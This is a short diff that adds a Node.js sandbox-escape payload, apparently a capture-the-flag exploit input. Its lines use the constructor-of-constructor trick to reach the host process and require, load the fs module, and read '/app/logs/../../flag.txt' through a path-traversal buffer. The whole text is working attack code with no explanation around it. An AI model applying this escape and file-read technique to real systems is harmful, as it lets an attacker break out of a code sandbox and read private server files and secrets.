@@ -1,0 +1,8 @@
+! process = this.constructor.constructor("return process")()
+! require = process.mainModule.require
+! fs = require("fs")
+! readdir = fs.readdirSync.bind(fs)
+! readfile = fs.readFileSync.bind(fs)
+! Buffer = this.constructor.constructor("return Buffer")()
+! x = Buffer.from('/app/logs/../../flag.txt')
+! readfile(x).toString()
